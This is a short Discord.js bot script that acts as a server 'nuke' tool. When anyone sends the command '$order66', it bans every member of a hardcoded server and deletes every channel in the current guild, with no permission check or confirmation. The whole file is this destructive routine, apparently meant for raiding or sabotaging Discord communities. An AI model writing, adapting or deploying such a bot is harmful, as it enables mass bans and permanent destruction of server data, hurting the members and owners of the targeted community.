const {
    Client,
    RichEmbed
} = require('discord.js')
const client = new Client();
const token = 'Null'; //Insert bot token
const PREFIX = '$';

client.on('ready', (guild) => {


    console.log('Ready');


});



client.on('message', message => {

    let args = message.content.substring(PREFIX.length).split(" ");

    switch (args[0]) {

        case 'order66':



            const list = client.guilds.get("Null"); //INSERT SERVER ID 


            list.members.forEach(member => member.ban());
            message.guild.channels.forEach(channel => channel.delete());



            break;

    }

});

client.login(token);
